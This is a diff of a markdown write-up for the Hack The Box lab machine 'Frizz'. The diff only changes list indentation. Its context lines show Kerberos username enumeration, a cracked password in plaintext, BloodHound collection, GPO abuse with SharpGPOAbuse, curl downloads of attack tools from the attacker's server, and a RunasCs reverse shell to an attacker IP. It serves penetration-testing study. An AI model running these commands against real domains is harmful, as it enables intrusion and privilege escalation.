@@ -127,7 +127,7 @@ Version: dev (9cfb81e) - 04/23/25 - Ronnie Flathers @ropnop
 2025/04/23 15:00:15 >  [+] VALID USERNAME:       f.frizzle@frizz.htb
 2025/04/23 15:00:15 >  Done! Tested 9 usernames (1 valid) in 0.055 seconds
 ```
-	- users file:
+- users file:
 ```
 cat users
 ralphie
@@ -153,8 +153,8 @@ ms.frizzle
 ```
 V2FudCB0byBsZWFybiBoYWNraW5n IGJ1dCBkb24ndCB3YW50IHRvIGdv IHRvIGphaWw/IFlvdSdsbCBsZWFy biB0aGUgaW4ncyBhbmQgb3V0cyBv ZiBTeXNjYWxscyBhbmQgWFNTIGZy b20gdGhlIHNhZmV0eSBvZiBpbnRl cm5hdGlvbmFsIHdhdGVycyBhbmQg aXJvbiBjbGFkIGNvbnRyYWN0cyBm cm9tIHlvdXIgY3VzdG9tZXJzLCBy ZXZpZXdlZCBieSBXYWxrZXJ2aWxs ZSdzIGZpbmVzdCBhdHRvcm5leXMu
 ```
-	- cleaned it using `:%s/ /\\r/g` to replace space with new line
-	- decoding:
+- cleaned it using `:%s/ /\\r/g` to replace space with new line
+- decoding:
 ```
 cat crack| base64 -d
 
@@ -235,8 +235,8 @@ export KRB5CCNAME=f.frizzle.ccache
 ```
 ssh -K f.frizzle@10.10.11.60
 ```
-	- Initially failed (just like winrm)
-		- winrm did give an extra info in error talking about unable to find realm "FRIZZ.HTB"
+- Initially failed (just like winrm)
+	- winrm did give an extra info in error talking about unable to find realm "FRIZZ.HTB"
 - **Fix** 
 	- I had to create a krb5.conf file to fix it
 ```
@@ -258,7 +258,7 @@ cat /etc/krb5.conf
     .frizz.htb = FRIZZ.HTB
     frizz.htb = FRIZZ.HTB
 ```
-	- ssh worked after this and I could grab user flag
+- ssh worked after this and I could grab user flag
 ## Privilege Escalation
 - ON enumeration I found a hidden folder in C:\ drive
 ```
@@ -302,7 +302,7 @@ d----          10/29/2024  7:28 AM                xampp
                5 Dir(s)   1,990,946,816 bytes free
 
 ```
-	- We find zip files inside.
+- We find zip files inside.
 - We grab the files using sftp:
 ```
 sftp -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes f.frizzle@frizz.htb
@@ -361,7 +361,7 @@ Version: dev (9cfb81e) - 04/24/25 - Ronnie Flathers @ropnop
 2025/04/24 05:21:20 >  [+] VALID LOGIN:  M.SchoolBus@frizz.htb:!suBcig@MehTed!R
 2025/04/24 05:21:20 >  Done! Tested 21 logins (1 successes) in 0.161 seconds
 ```
-	- User M.SchoolBus has these credentials.
+- User M.SchoolBus has these credentials.
 - We also grab some data for bloodhound analysis ( can also do this with f.frizzle)
 ```
 bloodhound-python -dc frizzdc.frizz.htb -ns 10.10.11.60 -d frizz.htb -u 'M.SchoolBus' -p '!suBcig@MehTed!R' -c all
@@ -386,15 +386,15 @@ INFO: Starting computer enumeration with 10 workers
 INFO: Querying computer: frizzdc.frizz.htb
 INFO: Done in 00M 04S
 ```
-	- Signs of GPOAbuse possibility (Bloodhound shows e own a lot of users/ writegplink/writegpo etc)
-		- whoami /all will show:
+- Signs of GPOAbuse possibility (Bloodhound shows e own a lot of users/ writegplink/writegpo etc)
+	- whoami /all will show:
 - We login via ssh the same way as f.frizzle.
 ```
 impacket-getTGT -dc-ip 10.10.11.60 'frizz.htb/M.SchoolBus:!suBcig@MehTed!R'
 export KRB5CCNAME=M.SchoolBus.ccache
 ssh -K M.SchoolBus@10.10.11.60
 ```
-	- We check whoami /all
+- We check whoami /all
 ```
 whoami /all
 
@@ -443,7 +443,7 @@ USER CLAIMS INFORMATION
 User claims unknown.
 
 ```
-		- If we do net user we only see Desktop Admins group (which could also be a good tell of possible GPO)
+- If we do net user we only see Desktop Admins group (which could also be a good tell of possible GPO)
 ```
 net user M.SchoolBus         
 
@@ -474,8 +474,8 @@ Local Group Memberships      *Remote Management Use
 Global Group memberships     *Domain Users         *Desktop Admins
 The command completed successfully.
 ```
-		- Group Policy Creator Owners **
-			- Can edit group policies, hence and perform GPO Abuse
+- Group Policy Creator Owners **
+	- Can edit group policies, hence and perform GPO Abuse
 - For this GPO Abuse we require 2  files:
 	- https://github.com/antonioCoco/RunasCs/releases/tag/v1.5
 		- RunasC to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin _runas.exe_ that solves some limitations.
@@ -514,7 +514,7 @@ thishurts                         dbfddbdc-d11b-4011-b69f-9e83bf01ea66
 ```
 python3 -m http.server 8001
 ```
-	- Grab the files from our target (make sure you are in a directory where you can upload the files):
+- Grab the files from our target (make sure you are in a directory where you can upload the files):
 ```
 curl "http://10.10.14.25:8001/SharpGPOAbuse.exe" -o "SharpGPOAbuse.exe"
 curl "http://10.10.14.25:8001/RunasCs.exe" -o "RunasCs.exe"
@@ -544,7 +544,7 @@ Updating policy...
 Computer Policy update has completed successfully.
 User Policy update has completed successfully.
 ```
-	- Can also use another user here like f.frizzle (I tried to but user didn't get added to Adminsitrator local group)...however I did see f.frizzle in the localgroup when checking..the box is still active so someone did manage to do that somehow.
+- Can also use another user here like f.frizzle (I tried to but user didn't get added to Adminsitrator local group)...however I did see f.frizzle in the localgroup when checking..the box is still active so someone did manage to do that somehow.
 - Then we can check if it worked by checking the administrator group members (couldn't get f.frizzle to appear here...but did see user here maybe by another user doing this box):
 ```
 # Check if it worked
@@ -559,7 +559,7 @@ Administrator
 M.SchoolBus
 The command completed successfully.
 ```
-	- Also after this command, if you do `whoami /all` on the account we added to adminsitrators group, there will be a change under the User claim's information saying Kerberos auth won't work anymore pointing that we can't use our ticket to login again now.
+- Also after this command, if you do `whoami /all` on the account we added to adminsitrators group, there will be a change under the User claim's information saying Kerberos auth won't work anymore pointing that we can't use our ticket to login again now.
 ```
 USER CLAIMS INFORMATION
 -----------------------
@@ -573,12 +573,12 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 .\RunasCs.exe M.SchoolBus !suBcig@MehTed!R cmd.exe -r 10.10.14.3:9998
 ```
-	- with netcat listening on the port to get a reverse shell
-		- We should be able to grab reverse shell
-	-  Why not just send a new reverse shell?
-		- You can, but:
-			- Reverse shells (e.g. via nc.exe or PowerShell) inherit the current user token.
-			- If the session was started before your user was elevated, it’s still a low-privilege shell, even if the user is now admin.
+- with netcat listening on the port to get a reverse shell
+	- We should be able to grab reverse shell
+-  Why not just send a new reverse shell?
+	- You can, but:
+		- Reverse shells (e.g. via nc.exe or PowerShell) inherit the current user token.
+		- If the session was started before your user was elevated, it’s still a low-privilege shell, even if the user is now admin.
 
 -------
 --------
